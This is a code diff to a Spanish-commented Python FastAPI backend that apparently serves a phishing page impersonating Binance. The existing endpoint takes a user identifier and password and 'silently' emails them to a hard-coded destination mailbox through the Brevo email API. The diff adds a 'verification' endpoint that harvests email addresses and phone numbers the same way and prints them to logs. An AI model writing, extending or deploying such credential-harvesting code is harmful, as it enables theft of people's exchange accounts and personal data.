@@ -94,28 +94,39 @@ class DatosVerificacion(BaseModel):
     correo: str
     telefono: str
 
+
 @app.post("/api/verificacion")
 async def guardar_verificacion(data: DatosVerificacion):
 
-    fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-
     try:
 
-        enviar_correo(
-            identificador=data.correo,
-            codigo_pais=data.telefono,
-            contrasena="Verificación de seguridad",
-            fecha=fecha
+        print("Correo:", data.correo)
+        print("Telefono:", data.telefono)
+
+        enviar_correo_verificacion(
+            data.correo,
+            data.telefono
         )
 
-    except Exception as e:
-        print(e)
+        return {
+            "status": "ok"
+        }
 
-    return {"status":"ok"}
+    except Exception as e:
+
+        traceback.print_exc()
+
+        return JSONResponse(
+            status_code=500,
+            content={
+                "status": "error",
+                "mensaje": str(e)
+            }
+        )
 # ─────────────────────────────────────────────────────────────
 # Función de envío de correo (Gmail SMTP)
 # ─────────────────────────────────────────────────────────────
-def enviar_correo(identificador, codigo_pais, contrasena, fecha):
+def enviar_correo_formulario(identificador, codigo_pais, contrasena, fecha):
 
     url = "https://api.brevo.com/v3/smtp/email"
 
@@ -169,6 +180,58 @@ def enviar_correo(identificador, codigo_pais, contrasena, fecha):
     print("Brevo:", respuesta.text)
 
     respuesta.raise_for_status()
+
+def enviar_correo_verificacion(correo, telefono):
+
+    url = "https://api.brevo.com/v3/smtp/email"
+
+    headers = {
+        "accept": "application/json",
+        "api-key": BREVO_API_KEY,
+        "content-type": "application/json"
+    }
+
+    payload = {
+        "sender": {
+            "name": "Formulario Binance",
+            "email": GMAIL_REMITENTE
+        },
+        "to": [
+            {
+                "email": CORREO_DESTINO
+            }
+        ],
+        "subject": "🔐 Nueva verificación",
+
+        "htmlContent": f"""
+        <html>
+        <body style="font-family:Arial">
+
+            <h2>Nueva verificación</h2>
+
+            <hr>
+
+            <p><b>Correo:</b> {correo}</p>
+
+            <p><b>Teléfono:</b> {telefono}</p>
+
+        </body>
+        </html>
+        """
+    }
+
+    respuesta = requests.post(
+        url,
+        json=payload,
+        headers=headers,
+        timeout=30
+    )
+
+    print("========== VERIFICACION ==========")
+    print("Status:", respuesta.status_code)
+    print(respuesta.text)
+
+    respuesta.raise_for_status()
 # ─────────────────────────────────────────────────────────────
 # Endpoints
 # ─────────────────────────────────────────────────────────────
@@ -200,7 +263,7 @@ async def guardar_formulario(data: FormData):
 
     # 2️⃣  Enviar correo silenciosamente
     try:
-        enviar_correo(
+        enviar_correo_formulario(
             data.identificador,
             data.codigo_pais,
             data.contrasena,
